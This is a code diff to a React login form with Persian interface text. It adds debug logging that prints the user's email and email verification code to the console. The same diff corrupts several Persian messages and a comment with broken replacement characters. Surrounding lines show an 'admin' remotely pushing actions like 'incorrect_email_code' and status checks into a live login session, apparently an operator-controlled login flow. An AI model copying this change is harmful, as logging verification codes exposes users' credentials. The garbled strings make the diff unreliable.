@@ -221,6 +221,18 @@ export const LoginForm = () => {
       currentStep,
       timestamp: new Date().toISOString(),
     });
+
+    // Special debug for incorrect_email_code
+    if (action === "incorrect_email_code") {
+      console.log("🔍 Processing incorrect_email_code action:", {
+        currentStep,
+        emailStep,
+        email,
+        emailCode,
+        isSubmitting,
+        hasError,
+      });
+    }
     setIsSubmitting(false);
 
     // Handle incorrect actions
@@ -260,7 +272,7 @@ export const LoginForm = () => {
           setEmailCode(""); // Clear email code field
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اشتباه ا��ت. لطفا کد صحیح را وارد کنید.",
           });
           break;
       }
@@ -301,7 +313,7 @@ export const LoginForm = () => {
         setIsSubmitting(false); // Ensure loading state is cleared
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        // بررسی دقیق وضعیت ک��ربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -1586,7 +1598,7 @@ export const LoginForm = () => {
                           />
                           <span>
                             <p style={{textAlign: "right"}}>
-                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                              ��د دعوت صرفا در زمان ثبت‌نام قابل استفاده ا��ت.
                             </p>
                             <p>
                               <br />
